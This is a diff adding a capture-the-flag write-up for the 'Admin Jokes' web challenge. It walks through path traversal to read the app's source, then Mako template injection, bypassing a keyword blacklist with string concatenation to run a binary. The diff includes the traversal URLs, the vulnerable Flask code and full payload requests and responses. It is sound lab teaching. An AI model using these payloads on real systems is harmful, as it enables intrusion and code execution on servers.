@@ -134,3 +134,158 @@ Success! By switching to the `HEAD` method, the server bypassed the authorizatio
 The pun in the flag confirmed the intended solution:
 
 **Final Flag:** `CATF{M4Yb3_Us1ng_y0ur_H34D_1S_us3full}`
+
+* * *
+
+==========================================================
+
+🕸️ Web Series: Admin Jokes
+===========================
+
+Welcome to the second web challenge in this series. This one required chaining a few classic web vulnerabilities together: starting with an LFI (Local File Inclusion) to leak the source code, discovering a hidden endpoint, and ultimately exploiting an SSTI (Server-Side Template Injection) while bypassing a security filter to get an RCE (Remote Code Execution).
+
+**Author:** 0xdblm
+
+**Points:** 100
+
+![challenge](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Adminjokes/challenge.png)
+
+📝 The Challenge Description
+----------------------------
+
+> "Admin is a wise man; he doesn't say silly jokes."
+
+> **URL:** `http://167.99.34.2:5008/`
+
+Upon entering the site, I found a simple homepage for an "Admin Jokes Portal."
+
+![home](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Adminjokes/hone.png)
+
+It had a link pointing to: `http://167.99.34.2:5008/jokes?joke=1` Visiting this link displayed a basic joke about internal server errors.
+
+![firstpage](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Adminjokes/firstpage.png)
+
+🔍 Phase 1: LFI & Directory Traversal
+-------------------------------------
+
+My first instinct was to test the joke parameter for IDOR (Insecure Direct Object Reference) by changing the number. I manually enumerated the values and found that valid jokes existed from joke=1 up to joke=6. However, when I hit ?joke=7 (and anything above it), the server returned a "Not Found" error.
+
+Next, I tested for **Path Traversal / LFI** by inserting a classic payload: `http://167.99.34.2:5008/jokes?joke=../../../../../../../../../../../`
+
+**The Result:** Boom! The application listed the entire root directory of the Linux filesystem.
+
+![pathtraversal](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Adminjokes/pathtraversal.png)
+
+The listing showed some interesting files and directories: `.dockerenv`, `app`, `etc`, `flag.txt`, `readflagbinary`, `root`, `tmp`, etc.
+
+I immediately tried to read the flag: `?joke=../../../../../../../../../../../flag.txt`
+
+But the author was trolling:
+
+> _"CATF{Fake\_Flag\_Try\_Harder\_Buddy} hahahaha nice try! Hint: You need an RCE.... and look somewhere for the real flag."_
+
+![fakeflag](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Adminjokes/fakeflag.png)
+
+The most interesting file was `/readflagbinary`. However, trying to read it via the browser resulted in an Internal Server Error because it's an executable binary, not a text file. I needed an RCE to execute it.
+
+* * *
+
+🧩 Phase 2: Source Code Review via `/proc/self/cwd`
+---------------------------------------------------
+
+To get an RCE, I needed to understand how the backend worked. Since I had LFI, I used a well-known Linux trick to read the source code of the running application.
+
+By navigating to `/proc/self/cwd/`, which points to the Current Working Directory of the running process, I could read the main Python file: 
+`http://167.99.34.2:5008/jokes?joke=../../../../../../../../../../../proc/self/cwd/app.py`
+
+![burprequest](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Adminjokes/burprequest.png)
+
+I extracted the source code. Here is the most critical part of the application logic:
+
+Python
+
+    from mako.template import Template
+    import os
+    
+    BLACKLIST = ["os", "system", "eval", "popen", "subprocess"]
+    
+    # ... (other routes) ...
+    
+    @app.route("/admin/profile")
+    def admin_profile():
+        name = request.args.get("name", "Admin")
+        lowered = name.lower()
+        
+        if any(token in lowered for token in BLACKLIST):
+            return "Blocked by security filter.", 403
+    
+        template = Template(f"<h2>Admin Profile</h2><p>Welcome, {name}</p>")
+        return template.render() 
+
+* * *
+
+💻 Phase 3: Exploiting SSTI (Server-Side Template Injection)
+------------------------------------------------------------
+
+From the source code, two things were immediately obvious:
+
+1.  **The Template Engine:** The app uses `mako.template.Template`.
+    
+2.  **The Vulnerability:** The `name` parameter in the `/admin/profile` route is directly concatenated into the template string `Template(f"...{name}...")` before rendering. This is a classic **SSTI** vulnerability.
+    
+
+### 1\. Proof of Concept (PoC)
+
+I navigated to the hidden endpoint and tested a basic Mako SSTI payload: `GET admin/profile?name=${7*7}`
+
+**The Response:**
+
+HTTP
+
+    HTTP/1.1 200 OK
+    Admin Profile 
+    Welcome, 49
+
+![49](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Adminjokes/49.png)
+
+The math executed! The SSTI was confirmed.
+
+### 2\. Bypassing the Blacklist for RCE
+
+To read the flag, I needed to execute the `/readflagbinary` file. However, the developer implemented a blacklist: `BLACKLIST = ["os", "system", "eval", "popen", "subprocess"]`
+
+I couldn't just use standard Python OS commands because the `name.lower()` check would block them.
+
+**The Bypass:** I crafted a payload using string concatenation inside the template execution block. By breaking the banned words into smaller strings and adding them together, I bypassed the filter.
+
+`'o'+'s'` avoids the `"os"` filter. `'po'+'pen'` avoids the `"popen"` filter.
+
+**The Final Payload:** `${__import__('o'+'s').__dict__['po'+'pen']('/readflagbinary').read()}`
+
+* * *
+
+🏁 Phase 4: Getting the Flag
+----------------------------
+
+I sent the final crafted payload via Burp Suite to execute the binary:
+
+**Request:**
+
+    GET admin/profile?name=${__import__('o'+'s').__dict__['po'+'pen']('/readflagbinary').read()} HTTP/1.1
+    Host: 167.99.34.2:5008
+    Connection: keep-alive 
+
+**Response:**
+
+    HTTP/1.1 200 OK
+    Server: Werkzeug/3.1.6 Python/3.12.13
+    Date: Tue, 24 Mar 2026 17:10:11 GMT
+    Content-Type: text/html; charset=utf-8
+    Content-Length: 87
+    Connection: close
+    
+    <h2>Admin Profile</h2><p>Welcome, CATF{Mak0_LF1_2_SSTI_Adm1n_J0k3s_Pwn3d_9f4e2b7c}</p>
+
+![flag](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Adminjokes/flag.png)
+
+**Final Flag:** `CATF{Mak0_LF1_2_SSTI_Adm1n_J0k3s_Pwn3d_9f4e2b7c}`
